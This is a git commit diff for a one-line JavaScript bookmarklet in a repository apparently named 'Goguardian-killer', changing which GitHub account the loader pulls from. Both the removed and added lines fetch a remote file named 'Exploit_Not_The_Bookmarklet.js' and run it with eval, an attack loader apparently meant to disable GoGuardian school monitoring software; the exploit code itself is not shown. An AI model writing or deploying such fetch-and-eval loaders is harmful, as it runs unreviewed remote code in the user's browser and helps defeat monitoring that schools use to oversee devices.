cda7044044e8ae38905f3ed78d00b4939fda12f0
fisheythecheeks <wyattaber2@gmail.com>
2025-08-20 09:28:31 -0700

    Update TheActualBookmarklet.js

--- TheActualBookmarklet.js
+++ TheActualBookmarklet.js
@@ -1,1 +1,1 @@
-javascript:fetch(`https://raw.githubusercontent.com/jz2k09/Goguardian-killer/main/Exploit_Not_The_Bookmarklet.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/fisheythecheeks/Goguardian-killer/main/Exploit_Not_The_Bookmarklet.js`).then(data=>{data.text().then(text=>{eval(text)})});
